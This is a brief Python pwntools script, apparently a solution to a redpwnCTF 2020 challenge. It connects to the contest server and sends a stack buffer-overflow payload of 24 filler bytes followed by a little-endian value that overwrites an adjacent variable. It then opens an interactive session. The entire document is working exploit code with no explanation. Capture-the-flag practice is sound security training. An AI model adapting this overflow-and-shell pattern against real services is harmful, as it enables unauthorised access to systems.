from pwn import *

host, port = '2020.redpwnc.tf', 31199

r = remote(host, port)

payload = 'AAAAAAAABBBBBBBBCCCCCCCC\x01\x00\x00\x00\x00\x00\x00\x00'

print(r.recv())
r.sendline(payload)
r.interactive()